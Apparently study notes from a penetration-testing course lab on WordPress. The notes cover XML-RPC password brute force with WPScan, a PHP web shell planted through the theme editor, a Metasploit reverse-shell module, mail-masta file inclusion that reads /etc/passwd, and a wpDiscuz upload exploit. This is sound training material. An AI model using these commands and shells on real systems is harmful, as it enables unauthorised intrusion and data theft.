![Image](https://images.openai.com/static-rsc-4/IbM02yfJFaki2Rm7LjO8AQWH8XUOrygKPkXOuD0uwjEQFev_BzCSDEvY7PyrsF2d1ik25wQNg1fRuiFfh1jpC7T20m14iKlDZr8ABuNcJty--JBIIdiJVB1XBDEALPn3Hb86KTjbyIlTNUw9BBMCNbWOm-h4rfS_nc9TgUklvoqRpUA1fTtiGw2ZV3TWO18L?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/bqWVt_2vR_okv8A5Nfflz2-QEp6jb7wzhPO5tmWXK-WNvJO6DzCddNomFQ6fb8ViEx1Qhab3GsL0u9FJfVkhbdHWkUx_EQi_aMEk5JRz6FmR6XrC0BbvKuy9Z1HAFD3wwFq752NUohOyK1ex28CBlHUJaKthau5Hc6hmbxREHz2NI3DOQGo6Duhvr_FpdMya?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/Ir2JGDAC6GBIaNAB_avXTUQIot2JB9yrfLajmViqlnOtLxg2Bs_QjjzRLzLWwhSWDiLGin_9syUiocv-DE9gsN6f8zrFPpwQkRIpItgcPN_5fKGkBbIkwtXqFg2xfa4e3QTrqVGgCRWznTrMTtoXAn_ngP9TVt9JXRq7D84qguq03BKvDkvq1XZipqbXXGGY?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/AzXsDw3uQJBfFHLOPrSKkkhVVqfeQ7a3HOOfzQ-WQxTwvYX4h-0suMkGLGMYOQQOcP7v6ZM1uhQIYQns8JCT1JG86whn_GuId3nb0O6qRzk5U3eMgBb-lRUeDounXKZ-Y5jZyX1sGWklg9IyN-YSrBsfjJVIZ39xbNjRx_XdCfD7GF_zUZDaPc0yA13fga9c?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/wKRYQU8bIic7uYDqhhkmAmwzp3L5ir7p1MWLPDKNfZnbWpchjmcaGz3wLsZUFwQvLEVC-IvPrNDsZ44y3efApDWHPgDzMB7bOXLWcAOCiKKebKMBHcsztXGMZYfnZRbcHRmgBrDZwXDqy4Lvy2IkMn811CT4OY1769b08TDCrqh5zBYOK4w1-oHf30itJ2TU?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/twTdas-uIPECPDkla5YjiD5WxaWYv79ZmNwIis7pxV4A3MkxJ3shaqo2AlEqQ_UFLXWZOsqoJmTpjzwuP1PiOwYEEUjiZkOwx2EkEQ_yG4J42mbxo_-wNdA3qQVYRG9POtRhxWp7kvAyZXokvkGPJb7RO-U8wv2YVUSMWpT62eHerhNN05_UUT8gpXDzc6eb?purpose=fullsize)

The previous section established that the target was running WordPress and that its **version and installed plugins had been enumerated**.

The goal now is to identify attack paths and potentially gain access to the internal network.

---

# 🧭 1. Attack Paths Covered

The material focuses on abusing **built-in WordPress functionality**.

The two primary techniques are:

```text
1. Login Brute Force
       ↓
2. Obtain Administrator-Level Credentials
       ↓
3. Access WordPress Backend
       ↓
4. Modify PHP Theme Code
       ↓
5. Remote Code Execution
```

The two techniques build on each other because administrator-level access is needed to edit a theme through the WordPress backend.

---

# 🔐 2. Login Brute Force

![Image](https://images.openai.com/static-rsc-4/OIh59Lg1XtVquaZ_U2EGGh7ChTZX8SvpaqaxXIVZQdYs9Gq6YwSCLoqvqiBuuafjNfTYw9kCnY04FNpYhIj2HNjui9MnYOJB2-pc4NrCudlF9z5tL4zkPvoc9eYhRPhT5LDMNKKokcRuDoUspSfcpVmmfiPcw672br2mXhEw4yT19Wpwbs9BmRmag19hMUPM?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/m4BwCsxKeAxUWtqqrCEoEr-ANyRABvqVfML1udc5IoVgjfoL4twx3P4d4kDVgjlJlVXN6071DQWOiu0GXSw7plpc4-VWUuPbFUTgijxp4i61v_trsD_Vwc1KeDDEqfVQ-KVjnQ51mM5s41yK6_IvIjVBedG84rT8YXqK_iQgqII4JbSJpKdQ62FFmFHSX-Qb?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/yyYnanCBsTVB4WK0S1RsennrfHtABd5rlL5EUilKBgpqIaSedU_CXHpLLNQCUJwGZr4Cr6vC-9BNSvsc4-WQX4_HURZRhWa_kny5S_AbCSEzmnGPWcpNq_2bY2Ojl3kXH8DFKZkVrY-6mmtxnj-ag0nJULlQ8n4iGY2WUExKyu4-PDEb1MCKYIqnKc0iDyfP?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/EA1N6lpD223_eImPxZqgieOE6oEyJ8fblEH8YhD4Y8raIeWjiNSjUDUGPxSVrL7cANSs9mTkzt6gKyt9P7JV8qt8sjdUw8muaQTh_w3zxN29TWZImUBGGx95GQ6ZZpxLHVKOMy45flIzXtgI8bIcALryg2lZmHr1hu5AXx7Ao1nYMu-FQaHKsNn8Q1lB9gS0?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/Q5YPeON0vcCx8hUcYz4kOasrFSZAvFEm6rNT1UrxJq_hJWPd3bJFGYuakOeIY1qGWIGZpQMHTpl5nucLFjg1CI1p7hqyzrnlGxRYYlBOLKeu5nPbD3Eok6n8lYKhAT_7lNlXQaNGbTYDNtif4kAcsRiQ_YfQ5eWivC081BdRK3uCI4H3GKlFUYb1H5gv0XsR?purpose=fullsize)

**WPScan** can be used to test usernames and passwords.

From the previous enumeration, two users had been identified:

```text
admin
john
```

WPScan supports two login brute-force methods:

### Method 1 — `wp-login`

Targets the normal WordPress login page:

```text
/wp-login.php
```

### Method 2 — `xmlrpc`

Uses the WordPress API through:

```text
/xmlrpc.php
```

The source notes that the **XML-RPC method is preferred because it is faster**.

---

# 🧪 3. WPScan XML-RPC Password Attack

The source example uses:

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

### Breakdown

|Option|Meaning|
|---|---|
|`--password-attack xmlrpc`|Use XML-RPC password attack|
|`-t 20`|Use 20 threads|
|`-U john`|Target username `john`|
|`-P /usr/share/wordlists/rockyou.txt`|Password wordlist|
|`--url`|Target WordPress URL|

> **Use this type of testing only against systems explicitly authorized for the assessment.**

---

# 🎯 4. Successful Credentials

The scan eventually returned:

```text
[SUCCESS] - john / firebird1
```

and:

```text
[!] Valid Combinations Found:
| Username: john, Password: firebird1
```

Therefore:

```text
Username → john
Password → firebird1
```

The source notes that WPScan successfully found valid credentials for the `john` account.

---

# ⚙️ 5. Important WPScan Parameters

The three parameters you should remember from this example are:

### `--password-attack`

Specifies the password attack method.

Example:

```bash
--password-attack xmlrpc
```

### `-U`

Specifies usernames or a username file.

```bash
-U john
```

### `-P`

Specifies passwords or a password wordlist.

```bash
-P /usr/share/wordlists/rockyou.txt
```

### `-t`

Controls the number of threads.

```bash
-t 20
```

You can adjust the number of threads depending on the assessment environment.

---

# 🚨 6. Why XML-RPC Is Important

The authentication path is:

```text
Attacker
   │
   ▼
/xmlrpc.php
   │
   ▼
WordPress XML-RPC API
   │
   ▼
Authentication Attempts
   │
   ▼
Valid Credentials
```

The important point from the material is that XML-RPC provides an alternative authentication mechanism and is **faster for password attacks** than the standard `wp-login` method.

---

# 💻 7. Code Execution Through the Theme Editor

Once administrative access is obtained, WordPress allows administrators to modify PHP source code through the backend.

The source's chain is:

```text
Valid Credentials
       ↓
WordPress Login
       ↓
Admin Panel
       ↓
Appearance
       ↓
Theme Editor
       ↓
Edit PHP
       ↓
Execute System Commands
```

---

# 🎨 8. WordPress Theme Editor

After logging in:

```text
Appearance
    ↓
Theme Editor
```

The Theme Editor allows PHP source files belonging to a theme to be modified directly.

The material recommends selecting an **inactive theme** to avoid corrupting the primary theme.

The known active theme was:

```text
Transport Gravity
```

An alternate theme used in the example was:

```text
Twenty Nineteen
```

---

# 📄 9. Editing `404.php`

The example chooses:

```text
404.php
```

as the page to modify.

A single PHP line is added:

```php
system($_GET[0]);
```

This causes the application to execute the command supplied through GET parameter:

```text
0
```

The source recommends placing the line below the comments to minimize modifications to the existing file.

---

# 🧠 10. Understanding the Web Shell

The PHP code:

```php
system($_GET[0]);
```

conceptually works like:

```text
HTTP Request
     │
     ▼
?0=<command>
     │
     ▼
$_GET[0]
     │
     ▼
system()
     │
     ▼
Operating System Command
```

So a request such as:

```text
404.php?0=id
```

causes the PHP interpreter to pass:

```text
id
```

to the operating system.

### Result

The source demonstrates:

```text
uid=33(www-data)
gid=33(www-data)
groups=33(www-data)
```

This means the command execution is occurring under the:

```text
www-data
```

account.

---

# 🌐 11. Theme Location

WordPress themes are stored under:

```text
/wp-content/themes/<theme name>
```

Therefore the modified theme file becomes reachable through the theme's web path.

The example interacts with the modified `404.php` using:

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

The resulting execution confirms:

```text
www-data
```

command execution.

---

# 🔥 12. Attack Chain — Theme Editor

![Image](https://images.openai.com/static-rsc-4/J4LPh6arCXR3z9D0tr7wYGoIP_oXfLCpfPos6X0zo4yR4FvQzuHqdENa9Xzxq6wI3bgkJlONGdbgxSlUjtRnb2bNs4299sNc-3UGgH3lpTx6Bx_CCx4vtwBKGYd2u4Y3tF7VUH1KySX0PEVXCe7Xlrs_J3SuEGglhA_oyXAqmC7QpOeH8QfM7C3t1DWKMvN5?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/W6T3no_26ERb0wSfm9e37_DXzSfAK_sx1x1AYbpxSvg-kJbolg24UFGgBBWcsWB2-pcCSsfLT44hRBJGsCniFwy3hv2z42BwL0rhDWFW2ZhjgREdV5e2ijaswGDSIYLNcjgrhy9SZu3WWZhs_v3NpYTXn_yR-LvfMfiQJiEoZr0UHrk806CeQVGLDplNBxSo?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/pDyqnC9JqEMja1dXFwALDZLGqhGXGxtqslnmxlLyqGCzVkzFvMGoNDskIdtGEbH_zHGCw7ockPfN4q8uJVbYEf1pkCvXDLlpagdUsMUnfeXRYaZaCoHcvp6oBRbQZ51ixw_K1dzDtpeFi43fpCmN5XBK1nDjqzuXCnXA6n6eIh9KJu6kKG6qk3CeV9ySGjtO?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/ujFdA2yzqRqid3N3ROb21mLQp_7-j9l7leG2h3Wko_d7Qwu_yto65vIZ1-vuLAeF-avmDYQX6FDojzMh47DEg6rrK_nABHzZHXYsMhi_SpMI81QhAtZ5__21Cd2JE9CJk3NcPGlcRxhS2QUuYump5obamGLP9Mlz6WW0fEa8XndPMOhpaKzfehzjFcl46mf4?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/dWF1AD7TY0B3AizKgTUSDsgYtyLD2c808yJ-57LTwwRF7OgWne5iKXvdFuHOuLdLo3m8bO29Q1Rbai02xUtwblrz6qQ1m0r8c4aqrmpSfGmiFnyEu-It8B5YeXsNgJaMSNMpCRDbWfSAHH4Goo4nrklLyvxRInJUtVqrcSpGLSZHrDegChihK9PPJhAEWXOd?purpose=fullsize)

Memorize this chain:

```text
Brute Force / Credential Discovery
             ↓
       Valid Credentials
             ↓
        WordPress Login
             ↓
       Admin-Level Access
             ↓
       Appearance
             ↓
        Theme Editor
             ↓
        Edit PHP File
             ↓
        Save Changes
             ↓
       Web-Accessible PHP
             ↓
       Command Execution
             ↓
        www-data Shell
```

This is the central attack path of the section.

---

# 🛠️ 13. Metasploit Alternative

The source also demonstrates using the Metasploit module:

```text
exploit/unix/webapp/wp_admin_shell_upload
```

The module can:

1. Authenticate to WordPress
    
2. Upload a malicious plugin
    
3. Execute it
    
4. Provide a PHP Meterpreter shell
    

---

# 🧰 14. Metasploit Configuration

The module is selected using:

```text
use exploit/unix/webapp/wp_admin_shell_upload
```

The source then configures:

```text
username
password
lhost
rhost
VHOST
```

Example from the material:

```text
set username john
set password firebird1
set lhost 10.10.14.15
set rhost 10.129.42.195
set VHOST blog.inlanefreight.local
```

---

# 📋 15. `show options`

Before launching the module, use:

```text
show options
```

This is important because it allows you to verify that all required options are correctly configured.

The source specifically notes that both:

```text
VHOST
IP address
```

must be correctly specified in this lab example.

Otherwise, the exploit fails with:

```text
Exploit aborted due to failure: not-found:
The target does not appear to be using WordPress
```

---

# ⚙️ 16. Important Metasploit Options

From the source:

|Option|Example|Purpose|
|---|---|---|
|`USERNAME`|`john`|WordPress username|
|`PASSWORD`|`firebird1`|WordPress password|
|`RHOSTS`|`10.129.42.195`|Target IP|
|`RPORT`|`80`|Target port|
|`TARGETURI`|`/`|WordPress base path|
|`VHOST`|`blog.inlanefreight.local`|HTTP virtual host|
|`LHOST`|`10.10.14.15`|Listener address|
|`LPORT`|`4444`|Listener port|

---

# 🧠 17. Why `VHOST` Matters

A server may host multiple websites on the same IP.

For example:

```text
10.129.42.195
      │
      ├── blog.inlanefreight.local
      ├── app.inlanefreight.local
      └── dev.inlanefreight.local
```

The HTTP `Host` header determines which virtual host should respond.

Therefore, when a tool expects a WordPress site but multiple sites share the IP, the correct:

```text
VHOST
```

may be necessary.

---

# 💥 18. Obtaining a Meterpreter Session

After configuration:

```text
exploit
```

The source demonstrates the following sequence:

```text
Started reverse TCP handler
        ↓
Authenticated with WordPress
        ↓
Prepared payload
        ↓
Uploaded payload
        ↓
Executed payload
        ↓
Meterpreter session opened
```

The resulting session runs as:

```text
www-data (33)
```

confirmed with:

```text
getuid
```

---

# 🧹 19. Artifact Cleanup

This is **extremely important for real penetration testing**.

The Metasploit module uploaded:

```text
/wp-content/plugins/CczIptSXlr/wCoUuUPfIO.php
```

and subsequently deleted its created files/directories.

The source points out that tools often attempt automatic cleanup, but this isn't guaranteed.

### During an assessment

You should make every reasonable effort to clean up:

```text
Uploaded shells
Temporary files
Malicious plugins
Created accounts
Modified files
Other artifacts
```

---

# 📝 20. Reporting Artifacts

Even if an artifact is successfully removed, it should still be documented.

The report appendix should include information such as:

### Exploited systems

```text
Hostname/IP
+
Method of exploitation
```

### Compromised users

```text
Account name
+
Method of compromise
+
Account type
```

For example:

```text
Local
Domain
```

### Artifacts created

```text
Uploaded files
Plugins
Scripts
Other files
```

### Changes

Examples:

```text
Added local administrator
Modified group membership
Changed configuration
```

---

# 🚨 21. Leveraging Known Vulnerabilities

WordPress has historically suffered from many vulnerabilities.

But the source emphasizes an especially important point:

> **The vast majority of vulnerabilities are found in plugins.**

At the time the material was written, the WPScan database contained:

```text
23,595 vulnerabilities
```

Broken down as:

```text
WordPress Core → 4%
Plugins        → 89%
Themes         → 7%
```

### ⭐ Memorize this

```text
Plugins → 89%
Core    → 4%
Themes  → 7%
```

These are **historical figures from the source**, not current statistics.

---

# 📈 22. Why WordPress Vulnerabilities Keep Growing

The source attributes the growth largely to:

- Huge numbers of free themes
    
- Huge numbers of paid themes
    
- Large plugin ecosystem
    
- New plugins being added continually
    

This means a tester needs to be particularly thorough when enumerating WordPress.

You may encounter:

```text
Recently vulnerable plugins
        OR
Old forgotten plugins
```

Even if an old plugin is no longer actively used, it may still be accessible on the server.

---

# 🕰️ 23. Forgotten Plugins

This is an important real-world concept.

Consider:

```text
Plugin installed
      ↓
Developer stops using it
      ↓
Plugin removed from WordPress configuration
      ↓
Files remain on server
      ↓
Vulnerable code still accessible
```

Therefore:

> **Unused does not necessarily mean harmless.**

A forgotten plugin may still expose vulnerable files.

---

# 🕵️ 24. Wayback Machine & `waybackurls`

The source recommends:

```text
waybackurls
```

for finding older versions of a target through the **Wayback Machine**.

Conceptually:

```text
Current Website
       │
       ▼
Historical URLs
       │
       ▼
Old WordPress Version
       │
       ▼
Old Plugin
       │
       ▼
Known Vulnerability
       │
       ▼
Plugin Directory Still Present
       │
       ▼
Potential Attack Path
```

### ⭐ Important idea

A component may disappear from the current website but its files may still remain accessible.

---

# 🐛 25. Vulnerable Plugin — mail-masta

![Image](https://images.openai.com/static-rsc-4/_MmbonBhw72f03E5eZ646uXqrKorPNZ-B-5UAX6BnPGa38h_PL2Yb4mR4JK5Rl4624S0rr2P1cLEW16gncTaWGow86f6nAT_41VMQBDmGo41Nny9oK3B5VO0Crr6CnwDmd2Ig55pfp6b9UUAQrWGmW7ftNpXUGS5_AfQSW4CVezOPcMFt1jvdP127_nVSnAy?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/BEiT1sZze4E6vJ0dMEQ8S5mSBegmOmRh7_Q8Hx1X4frFWF7ysmuLt1oZPs_4mCWNDhKcM3-xORQUwTqwQwfpDaC352xfDK3G0AtwhZLT7oVKEQDBtKS2c0LRMJtMP3axlnDFY3Xdp_gARYWWdMtRB0wzVi-bC6WA4HNm8e4js41U2qpyZH7Sag4JRLzb_mSP?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/Lmnfwv19b7t4q-VPQf4Nl_Jv6I1OHz5bEHRGnJfQQIRU1AF_Cl3PwjAJDyNJZRke4_VMAdS43p8GuqMbZ-jTOtII6tTMk8vkHHwyFr8wEFCJRyVzD07vg-m0lTYXM_O0BSdiToimp8iaGVpP6zouz2gpsPgoVdz84mKJrU2FNfZ6amEkGHv5oFPZAFcTsEkS?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/RBRb2Bum3v1maDOqqPqz6muPPICbVhWO6uddmhG_lv5Pev4XeeGO8u0egOZj6SJPOc1BjW1cMAYjHCqe9mmPvwmnfNGgHOJwuytfeC1bPk_hEhlgbFG38Xoxl5nFFk07_Dz7uIC6KArhYDE05FgGVou4rCkC5dLRusZSUFBiX2AmWR8GxnuGA-62j4iAPh3O?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/o0iAFxsIdmEgH1wOrlaW06lfnyLUOHJy2WU1K5-5Se146H1SLnb8zXwbKBw9FbSNZZwi-5y3RqwVil2JPPEHkDF0SvominBJZUZI021JD4rXcWhT2qBzuGy03iV_unRF2lpzq_BsmZFZeGwYy0Svk70UFLa0lKJove7qQSJrchlHEO6TXc373_XcMTy8R4ZS?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/fC_8kvwTzmuluIJ9BiDyuUzeEsEL8YHJ5_3rYTm_KxCsO5y_P9KpuRGhlElwQY6PBCtoF72SbhAhve5vNwx4b1zo8yW-tC_uqLNukpPImX9nc3ZxUcx__7iCyYCJlWRxSJZ7wjiM5dsV2f82o7Ecg0aoH0NLmW8ugvN4rDCa_XZmi1liHOOy84SoOmtGo3ak?purpose=fullsize)

The source uses **mail-masta** as an example of an old/forgotten plugin.

The plugin was:

```text
No longer supported
```

but had historically accumulated over:

```text
2,300 downloads
```

The source identifies two vulnerabilities:

```text
Unauthenticated SQL Injection
Local File Inclusion (LFI)
```

---

# 🔬 26. Vulnerable `mail-masta` Code

The relevant code includes:

```php
include($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");
```

The particularly important line is:

```php
include($_GET['pl']);
```

---

# 🚨 27. Why `include($_GET['pl'])` Is Dangerous

The application takes:

```text
$_GET['pl']
```

and passes it directly into:

```text
include()
```

without input validation or sanitization.

Conceptually:

```text
User Input
    ↓
GET parameter "pl"
    ↓
include()
    ↓
Server includes attacker-controlled path
```

The source explains that this allows arbitrary files to be included from the web server.

This is the core of the **Local File Inclusion (LFI)** vulnerability.

---

# 📂 28. LFI Demonstration

The material demonstrates retrieving:

```text
/etc/passwd
```

using:

```bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

The response contains system account information such as:

```text
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
```

### ⭐ Key lesson

The vulnerability isn't merely:

> "A file can be read."

The deeper issue is:

```text
Untrusted Input
       ↓
File Inclusion
       ↓
Sensitive File Access
```

Depending on application context, LFI can potentially become much more serious.

---

# 💬 29. Vulnerable Plugin — wpDiscuz

![Image](https://images.openai.com/static-rsc-4/9zdlYs2l_VIyMmJrMGC8wN65ts8TnquerJKavA3cZQSRdqGP5AlFLnx3is7ogmzpLbRHNsY3SCaimA5glHQ2l3Z5IdORN8m_SsWm7bvIbdFA-1sl7ZEiB8L7STF453gdaFhaMBrCYljjhw2wHndhYqXyIaD166MhbxAl8O6Or3ojO8vIFV3z-STuzZlG4BaF?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/vIU1O0qIRJxTESX_huebJUD2BI8jmDv8nCBmiGPOnQNpLW0ipTZnGp1ZBTxbvAq9algz7WV8HvMNUfGFWqIOqHV9WGwEipNvsR5qkX2SpK51-u0umJqrvSgIfShv5s5ovqnjKN2_NqZS0ejbMLLrxEFV7ci8Sj9YK_RBLsmXK6GKhrmLyvmbnFvzx9y20Cqc?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/r0gUmMUXpUmMcFxoK3QPZTEAqLzurTPh6fVETBJfTG0MAoF4589RyI8NpQzhSvCnm37MvkoEW-xhqBQxj0IuraflbJhz6ShyGawCqn-T0lALsPLdYmZ0GNJOHL81d4C6crbYdVmLFOVQPZM0xp4TGB56oflUYypQOwU0PJ-JTyeGl09KmjFZabMSYWCcyPC2?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/LvPjXo0UaEZTPpYpzFBVFsEz5iofbUT27Nd69j0n4WFMpSiwHkqWoUhnwcO6qfdjpZ6jj061PxURZTYe8SgeqZlBiQShltRRbBlY_EOPaosoVsj--a6eK3dEe4gFsUUF8FpfW1B2Qm7JB1oIEycdaBmLWkSIo3jQkSnSd-vdxTc8Mx-oihAnseARIqBXSobL?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/Rq13buWpPrQ6RonjTp6WTLjf1d_0cmMBWEX_QhSnaNiYPcnkQ4ifu7WrEckYJw871AvD6_PZl4xJGiLI2Yh9YrIQAo8cMEMQdjkjRfI78J5-qdOTk-LDnliA8CaLOaNmsf1hTig7p6bZK4a6SMJ22Dthgii-8eDTdBLa51DgkVVwUKPUsE973qpaPCREi9ed?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/dvN_xgSVXEUstAwKv6KAvmAdBnyOi6yqfsEtj7OmWn6uwb0SnIrdhVx1TyYze5p9RQbPu4AKE4M8Him1LANRHl1NPDqfPEHYhLvy69PVUxG9azUbRtSq75uKxBm1zbuuPEx3CSZCxjwXxpN1jTtrNutmK6D-LUS0I0Fp3in8fqKXSsWRnZaeJs7beYo9oAfZ?purpose=fullsize)

**wpDiscuz** is a WordPress commenting plugin.

The source states that at the time it had:

```text
1.6+ million downloads
90,000+ active installations
```

making it a popular plugin likely to be encountered during assessments.

The identified version is:

```text
7.0.4
```

---

# 🚨 30. wpDiscuz 7.0.4 Vulnerability

The source identifies:

```text
CVE-2020-24186
```

The vulnerability involves:

```text
File Upload Bypass
```

The intended functionality only permits:

```text
Image attachments
```

But the file MIME-type validation can be bypassed.

This can allow:

```text
Unauthenticated attacker
        ↓
Bypass file validation
        ↓
Upload malicious PHP file
        ↓
Remote Code Execution
```

---

# 🧪 31. wpDiscuz Exploit Parameters

The source's exploit script accepts:

```text
-u → URL
-p → Path to a valid post
```

Example:

```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

The output identifies:

```text
WordPress Plugin wpDiscuz 7.0.4
Remote Code Execution
File Upload Bypass Vulnerability
CVE-2020-24186
```

---

# 📤 32. Upload Result

The exploit generates a random webshell name and attempts to upload it.

The example reports:

```text
Generated webshell name:
uthsdkbywoxeebg
```

and:

```text
Upload Success
```

with the uploaded PHP file located under:

```text
/wp-content/uploads/2021/08/
```

The exploit's own execution attempt fails:

```text
[x] Failed to execute PHP code...
```

But this does **not necessarily mean the upload failed**.

---

# 🧠 33. Why Manual Validation Matters

This is another major lesson.

The automated exploit reported:

```text
Upload Success
```

but:

```text
Failed to execute PHP code
```

Instead of immediately assuming failure, the tester examined the exploit and determined how the uploaded file was intended to receive commands.

The source then validates the uploaded file manually using `cURL`.

### ⭐ General lesson

```text
Automated exploit fails
        ≠
Vulnerability doesn't exist
```

Always understand what the tool actually did.

---

# 💻 34. Manual Command Execution

The source demonstrates sending the command through:

```text
?cmd=
```

For example:

```bash
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```

The response includes:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

confirming command execution as:

```text
www-data
```

---

# 🧹 35. Clean Up the Webshell

The source explicitly states that the uploaded:

```text
uthsdkbywoxeebg-1629904090.8191.php
```

should be removed after testing.

It should also be documented as a **testing artifact** in the report appendix.

---

# 🔥 36. Comparing the Main Attack Paths

|Attack Path|Requirement|Result|
|---|---|---|
|Login brute force|Valid username + weak/guessable password|Valid WordPress credentials|
|Theme Editor|Admin-level access|PHP code execution|
|`mail-masta` LFI|Vulnerable plugin|Arbitrary local file inclusion|
|`mail-masta` SQLi|Vulnerable plugin|SQL injection|
|wpDiscuz upload bypass|Vulnerable wpDiscuz 7.0.4|Unauthenticated RCE|

---

# 🧩 37. Complete Attack Chain #1 — Credential-Based

```text
WordPress
    │
    ▼
User Enumeration
    │
    ▼
admin / john
    │
    ▼
Password Attack
    │
    ▼
john:firebird1
    │
    ▼
WordPress Login
    │
    ▼
Admin-Level Access
    │
    ▼
Theme Editor
    │
    ▼
Modify PHP
    │
    ▼
Command Execution
    │
    ▼
www-data
```

---

# 🧩 38. Complete Attack Chain #2 — Vulnerable Plugin

```text
WordPress
    │
    ▼
Plugin Enumeration
    │
    ▼
wpDiscuz 7.0.4
    │
    ▼
CVE-2020-24186
    │
    ▼
File Upload Bypass
    │
    ▼
PHP File Upload
    │
    ▼
Web-accessible Upload
    │
    ▼
Command Execution
    │
    ▼
www-data
```

---

# 🧩 39. Complete Attack Chain #3 — LFI

```text
WordPress
    │
    ▼
mail-masta
    │
    ▼
Vulnerable PHP File
    │
    ▼
include($_GET['pl'])
    │
    ▼
LFI
    │
    ▼
Local File Read
    │
    ▼
/etc/passwd
```

---

# 🧠 40. What Makes These Attacks Different?

### Credential Attack

Exploits:

```text
Authentication weakness
```

### Theme Editor Attack

Exploits:

```text
Excessive administrative functionality
```

### mail-masta LFI

Exploits:

```text
Unsafe file inclusion
```

### wpDiscuz RCE

Exploits:

```text
Improper file upload validation
```

This is why enumeration is so important: **different discoveries produce completely different attack paths.**

---

# 🎯 41. CPTS Methodology

When attacking WordPress, follow this general process:

```text
             DISCOVERY
                 │
                 ▼
       Identify WordPress
                 │
                 ▼
       Enumerate Core Version
                 │
                 ▼
      Enumerate Themes/Plugins
                 │
                 ▼
        Enumerate Users
                 │
                 ▼
       Identify Vulnerabilities
                 │
        ┌────────┴─────────┐
        ▼                  ▼
 Credentials          Known CVEs
        │                  │
        ▼                  ▼
Authentication       Vulnerability
 Testing               Validation
        │                  │
        └────────┬─────────┘
                 ▼
           Initial Access
                 │
                 ▼
         Code Execution
                 │
                 ▼
          Host Enumeration
                 │
                 ▼
       Privilege Escalation
                 │
                 ▼
        Lateral Movement
                 │
                 ▼
          Documentation
                 │
                 ▼
             Cleanup
```

---

# 🚨 42. High-Value Things to Remember

## ⭐ 1. XML-RPC

```text
/xmlrpc.php
```

WPScan can use it for password attacks and the source identifies it as the faster method.

---

## ⭐ 2. WordPress Admin

Administrative access can expose the:

```text
Appearance
   ↓
Theme Editor
   ↓
PHP source
```

which can lead to command execution.

---

## ⭐ 3. Themes

Themes live under:

```text
/wp-content/themes/
```

---

## ⭐ 4. Plugins

Plugins live under:

```text
/wp-content/plugins/
```

They represent a huge portion of the historical WordPress vulnerability landscape.

---

## ⭐ 5. Uploads

Uploaded content commonly appears under:

```text
/wp-content/uploads/
```

This is particularly important when investigating file-upload vulnerabilities.

---

## ⭐ 6. Forgotten plugins

An old plugin may remain accessible even if developers no longer actively use it.

```text
Unused ≠ Removed
```

---

## ⭐ 7. `include($_GET['pl'])`

This pattern is a major red flag:

```php
include($_GET['pl']);
```

because attacker-controlled input is being passed directly into file inclusion.

---

## ⭐ 8. wpDiscuz 7.0.4

From the source:

```text
CVE-2020-24186
```

```text
Unauthenticated file upload bypass
        ↓
PHP upload
        ↓
RCE
```

---

# 📝 43. Reporting Checklist

At the end of an assessment, make sure you have documented:

```text
[ ] Exploited systems
[ ] Hostnames/IP addresses
[ ] Exploitation methods
[ ] Compromised accounts
[ ] Account types
[ ] Credentials obtained through testing
[ ] Files created
[ ] Plugins uploaded
[ ] Webshells
[ ] Modified PHP files
[ ] Configuration changes
[ ] Added users
[ ] Group membership changes
[ ] Cleanup performed
[ ] Remaining artifacts
```

The source specifically calls out exploited systems, compromised users, artifacts, and system changes as information that should appear in the report appendices.

---

# 🏆 44. Final CPTS Takeaway

The most important lesson from this module is **not a single exploit**.

It's the methodology:

```text
ENUMERATE
    ↓
UNDERSTAND
    ↓
IDENTIFY ATTACK PATHS
    ↓
VALIDATE
    ↓
EXPLOIT
    ↓
ENUMERATE AGAIN
    ↓
PRIVILEGE ESCALATION
    ↓
LATERAL MOVEMENT
    ↓
DOCUMENT
    ↓
CLEAN UP
```

WordPress has a **vast attack surface**, and the material emphasizes that you will likely encounter it repeatedly during a penetration-testing career. The key skill is being able to **quickly fingerprint WordPress and then perform thorough manual + tool-based enumeration** to uncover high-risk vulnerabilities and misconfigurations.

### 🔥 One-line memory trick

```text
WORDPRESS
   ↓
USERS → CREDENTIALS → ADMIN
   ↓                    ↓
PLUGINS              THEME EDITOR
   ↓                    ↓
CVEs                  PHP CODE
   ↓                    ↓
RCE / LFI / SQLi  →  www-data
```

**The real CPTS skill is knowing how all those pieces connect into an attack chain—not just memorizing individual commands.**